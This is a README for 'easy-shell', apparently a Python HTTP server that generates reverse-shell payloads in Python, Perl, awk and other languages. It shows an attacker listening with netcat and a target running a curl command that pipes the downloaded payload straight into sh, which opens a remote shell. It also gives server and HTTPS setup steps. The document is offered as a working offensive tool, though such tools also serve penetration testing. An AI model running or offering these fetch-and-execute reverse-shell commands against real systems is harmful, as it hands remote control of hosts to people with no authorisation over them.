# easy-shell

A pure Python script to easily get a reverse shell.

### How it works?

After sending a request, it generates a payload with different commands available to get a reverse shell (python, perl, awk, and more).

### Example

##### Attacker machine
```
$ whoami
attacker

$ nc -l 8080
sh-4.4$ whoami
centos
sh-4.4$ pwd
/home/centos
```

##### Target machine
```
$ whoami
target

$ curl http://easy-shell.xyz/192.168.0.52:8080 | sh
```

### Running the server

Edit the following lines on ```easy_shell.py``` according to your needs:

```
PORT = 8080
DOMAIN = "http://127.0.0.1:{}".format(str(PORT))

HTTPS = False
KEY_FILE = "keyfile.key"
CERT_FILE = "certfile.cert"
```

If you want to run it over HTTPS, execute the following commands:

```
$ openssl genrsa 2048 > keyfile.key && chmod 400 keyfile.key
$ openssl req -new -x509 -nodes -sha256 -days 365 -key keyfile.key -out certfile.cert
```

### Used modules

- [ssl](https://docs.python.org/3/library/ssl.html#module-ssl)
- [http.server](https://docs.python.org/3/library/http.server.html#module-http.server)
- [socketserver](https://docs.python.org/3/library/socketserver.html#module-socketserver)
- [urllib.parse](https://docs.python.org/3/library/urllib.parse.html#module-urllib.parse)

### License

This project is licensed under the 3-Clause BSD License.